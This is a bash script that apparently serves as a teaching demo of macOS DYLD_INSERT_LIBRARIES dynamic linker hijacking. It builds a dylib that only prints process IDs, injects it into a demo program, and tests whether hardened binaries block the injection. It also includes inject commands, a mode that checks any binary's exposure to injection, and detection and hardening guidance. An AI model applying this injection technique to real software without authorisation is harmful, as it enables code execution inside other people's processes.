#!/usr/bin/env bash
# ============================================================
# DYLD_INSERT_LIBRARIES Injection Demo — The Eden's Sins Phase 3
# MITRE ATT&CK: T1574.006 Dynamic Linker Hijacking
#
# Demonstrates DYLD_INSERT_LIBRARIES injection technique:
# - Builds a minimal injectable dylib
# - Injects it into a target process
# - Shows how SIP and Hardened Runtime block this
#
# Requirements: Xcode Command Line Tools (for cc/clang)
# Usage: bash dyld_inject.sh [--target BINARY] [--demo] [--detect]
# ============================================================
set -euo pipefail

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
BOLD='\033[1m'
NC='\033[0m'

TARGET_BINARY=""
DEMO_MODE=false
DETECT_MODE=false
WORK_DIR="/tmp/cupertino_teardown_dyld"

banner() {
    echo -e "${CYAN}"
    echo "╔══════════════════════════════════════════════════╗"
    echo "║  THE EDEN'S SINS — DYLD Injection Demo        ║"
    echo "║  MITRE: T1574.006 Dynamic Linker Hijacking       ║"
    echo "╚══════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

log_info() { echo -e "${GREEN}[+]${NC} $1"; }
log_warn() { echo -e "${YELLOW}[!]${NC} $1"; }
log_err()  { echo -e "${RED}[-]${NC} $1"; }
log_sec()  { echo -e "${CYAN}[*]${NC} $1"; }

while [[ $# -gt 0 ]]; do
    case "$1" in
        --target)  TARGET_BINARY="$2"; shift 2 ;;
        --demo)    DEMO_MODE=true; shift ;;
        --detect)  DETECT_MODE=true; shift ;;
        -h|--help)
            echo "Usage: $0 [--target BINARY] [--demo] [--detect]"
            echo "  --target  Binary to test injection against"
            echo "  --demo    Run safe self-contained demo"
            echo "  --detect  Show detection and hardening guidance"
            exit 0
            ;;
        *) log_err "Unknown: $1"; exit 1 ;;
    esac
done

banner

# ─── Platform Check ───
if [[ "$(uname)" != "Darwin" ]]; then
    log_warn "Not on macOS — showing documentation mode."
    echo ""
    echo "DYLD_INSERT_LIBRARIES Injection:"
    echo ""
    echo "  Mechanism:"
    echo "    The macOS dynamic linker (dyld) supports DYLD_INSERT_LIBRARIES"
    echo "    env var, which forces a dylib to be loaded into every process."
    echo "    This is similar to LD_PRELOAD on Linux."
    echo ""
    echo "  Protections that BLOCK this technique:"
    echo "    1. SIP (System Integrity Protection) — blocks for system binaries"
    echo "    2. Hardened Runtime — blocks for signed apps with this entitlement"
    echo "    3. Library Validation — blocks unsigned dylibs"
    echo "    4. AMFI (Apple Mobile File Integrity) — kernel-level enforcement"
    echo ""
    echo "  Still works when:"
    echo "    • Target binary lacks Hardened Runtime"
    echo "    • SIP is disabled"
    echo "    • Binary has com.apple.security.cs.disable-library-validation"
    echo "    • Custom unsigned tools/scripts"
    echo ""
    echo "  Example injectable dylib (C):"
    echo '    #include <stdio.h>'
    echo '    __attribute__((constructor))'
    echo '    void inject_init(void) {'
    echo '        printf("[INJECTED] Dylib loaded into PID %d\n", getpid());'
    echo '    }'
    echo ""
    echo "  Compile & inject:"
    echo '    cc -dynamiclib -o /tmp/inject.dylib inject.c'
    echo '    DYLD_INSERT_LIBRARIES=/tmp/inject.dylib /path/to/target'
    echo ""
    echo "  Detection:"
    echo "    • Monitor DYLD_INSERT_LIBRARIES in process environment"
    echo "    • ESF: es_new_client with ES_EVENT_TYPE_NOTIFY_EXEC"
    echo "    • osquery: SELECT * FROM process_envs WHERE key = 'DYLD_INSERT_LIBRARIES'"
    echo "    • dtrace: proc:::exec-success { trace(curpsinfo->pr_envp); }"
    exit 0
fi

# ─── Detection Mode ───
if $DETECT_MODE; then
    echo -e "${BOLD}═══ DYLD_INSERT_LIBRARIES Detection Guide ═══${NC}"
    echo ""
    log_sec "Check for active DYLD injection in running processes:"
    echo ""

    # Check all running processes for DYLD_INSERT_LIBRARIES
    injected_count=0
    while IFS= read -r pid; do
        [[ -z "$pid" ]] && continue
        env_val=$(ps eww -p "$pid" 2>/dev/null | grep -o 'DYLD_INSERT_LIBRARIES=[^ ]*' || true)
        if [[ -n "$env_val" ]]; then
            proc_name=$(ps -p "$pid" -o comm= 2>/dev/null || echo "unknown")
            log_warn "PID $pid ($proc_name): $env_val"
            injected_count=$((injected_count + 1))
        fi
    done < <(ps -eo pid= 2>/dev/null | head -100)

    if [[ $injected_count -eq 0 ]]; then
        log_info "No DYLD_INSERT_LIBRARIES found in running processes ✓"
    else
        log_err "Found $injected_count processes with injected libraries!"
    fi

    echo ""
    log_sec "Check SIP status (protects system binaries):"
    csrutil status 2>/dev/null || log_warn "Cannot check SIP status"

    echo ""
    log_sec "Hardening recommendations:"
    echo "  1. Keep SIP enabled (csrutil enable in Recovery Mode)"
    echo "  2. Enable Hardened Runtime for all production binaries"
    echo "  3. Use Library Validation entitlement"
    echo "  4. Monitor env vars via ESF or osquery"
    echo "  5. Use Santa/BlockBlock for runtime monitoring"
    echo ""
    log_sec "osquery detection query:"
    echo "  SELECT pid, name, value FROM process_envs"
    echo "  WHERE key = 'DYLD_INSERT_LIBRARIES';"
    exit 0
fi

# ─── Demo Mode ───
if $DEMO_MODE; then
    log_sec "Building demo injectable dylib..."
    mkdir -p "$WORK_DIR"

    # Create injectable dylib source
    cat > "${WORK_DIR}/inject_demo.c" << 'INJECT_C'
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

/*
 * THE EDEN'S SINS — Demo Injectable Dylib
 * __attribute__((constructor)) runs when the dylib is loaded
 * into any process via DYLD_INSERT_LIBRARIES
 */
__attribute__((constructor))
static void inject_init(void) {
    const char *proc = getenv("_");
    fprintf(stderr,
        "\n"
        "╔══════════════════════════════════════════╗\n"
        "║  [THE EDEN'S SINS] DYLIB INJECTED!    ║\n"
        "╠══════════════════════════════════════════╣\n"
        "║  PID  : %-33d║\n"
        "║  UID  : %-33d║\n"
        "║  EUID : %-33d║\n"
        "║  Proc : %-33s║\n"
        "╚══════════════════════════════════════════╝\n"
        "\n",
        getpid(), getuid(), geteuid(),
        proc ? proc : "unknown"
    );
}
INJECT_C

    # Create demo target
    cat > "${WORK_DIR}/target_demo.c" << 'TARGET_C'
#include <stdio.h>

int main(void) {
    printf("[TARGET] Normal program execution.\n");
    printf("[TARGET] If you see the injection banner above, dyld injection works!\n");
    return 0;
}
TARGET_C

    # Compile
    log_info "Compiling injectable dylib..."
    ARCH=$(uname -m)
    cc -arch "$ARCH" -dynamiclib -o "${WORK_DIR}/inject_demo.dylib" \
        "${WORK_DIR}/inject_demo.c" 2>/dev/null

    log_info "Compiling demo target (WITHOUT Hardened Runtime)..."
    cc -arch "$ARCH" -o "${WORK_DIR}/target_demo" \
        "${WORK_DIR}/target_demo.c" 2>/dev/null

    echo ""
    log_sec "═══ Test 1: Normal execution (no injection) ═══"
    "${WORK_DIR}/target_demo"

    echo ""
    log_sec "═══ Test 2: With DYLD_INSERT_LIBRARIES ═══"
    DYLD_INSERT_LIBRARIES="${WORK_DIR}/inject_demo.dylib" \
        "${WORK_DIR}/target_demo" 2>&1 || true

    echo ""
    log_sec "═══ Test 3: Against Hardened Runtime binary ═══"
    log_info "Testing against /usr/bin/true (has Hardened Runtime)..."
    output=$(DYLD_INSERT_LIBRARIES="${WORK_DIR}/inject_demo.dylib" \
        /usr/bin/true 2>&1 || true)

    if echo "$output" | grep -q "INJECTED"; then
        log_err "Injection succeeded against hardened binary — SIP may be off!"
    else
        log_info "Injection blocked by Hardened Runtime ✓"
    fi

    # Cleanup
    echo ""
    log_sec "Cleaning up..."
    rm -rf "$WORK_DIR"
    log_info "Demo complete. Artifacts cleaned."

    echo ""
    echo -e "${BOLD}═══ Summary ═══${NC}"
    echo "  • DYLD_INSERT_LIBRARIES works against non-hardened binaries"
    echo "  • Hardened Runtime and SIP block injection"
    echo "  • Use codesign --options runtime to enable Hardened Runtime"
    echo "  • Detection: monitor DYLD_ env vars in process creation events"
    exit 0
fi

# ─── Target binary injection test ───
if [[ -n "$TARGET_BINARY" ]]; then
    if [[ ! -f "$TARGET_BINARY" ]]; then
        log_err "Target not found: $TARGET_BINARY"
        exit 1
    fi

    log_sec "Analyzing target: $TARGET_BINARY"

    # Check Hardened Runtime
    codesign_info=$(codesign -dvv "$TARGET_BINARY" 2>&1 || true)
    if echo "$codesign_info" | grep -qi "runtime"; then
        log_warn "Target has Hardened Runtime — injection likely blocked"
    else
        log_info "Target does NOT have Hardened Runtime — injection may work"
    fi

    # Check code signing flags
    if echo "$codesign_info" | grep -qi "library-validation"; then
        log_warn "Library Validation enabled — unsigned dylibs blocked"
    fi

    # Check entitlements
    entitlements=$(codesign -d --entitlements - "$TARGET_BINARY" 2>/dev/null || true)
    if echo "$entitlements" | grep -qi "disable-library-validation"; then
        log_info "disable-library-validation entitlement present — injection allowed!"
    fi

    echo ""
    echo "Full codesign info:"
    echo "$codesign_info" | head -20
fi
